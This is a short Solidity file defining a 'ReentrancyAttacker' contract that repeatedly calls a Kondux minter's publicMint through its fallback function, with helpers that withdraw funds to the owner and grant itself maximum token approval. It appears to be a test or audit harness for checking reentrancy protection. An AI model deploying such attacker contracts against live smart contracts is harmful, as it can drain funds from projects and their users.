// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

interface IKonduxTokenBasedMinter {
    function publicMint() external;
}

contract ReentrancyAttacker {
    IKonduxTokenBasedMinter public minter;
    address public owner;

    constructor(address _minter) {
        minter = IKonduxTokenBasedMinter(_minter);
        owner = msg.sender;
    }

    // Fallback function to attempt reentrancy
    fallback() external payable {
        if (address(minter).balance >= 1 ether) {
            minter.publicMint();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        minter.publicMint();
    }

    // Helper function to withdraw funds
    function withdraw() external {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }

    // Helper function to get max uint without using (-1)
    function maxUint256() public pure returns (uint256) {
        return 2**256 - 1;
    }

    // Function that gets approval from a given token contract address. The spender is this contract. Get approval for the max amount.
    function approve(address token) external {
        // Approve the contract to spend the max amount
        (bool success, bytes memory data) = token.call(abi.encodeWithSignature("approve(address,uint256)", address(this), maxUint256()));
        require(success, "Failed to approve");
    }
}
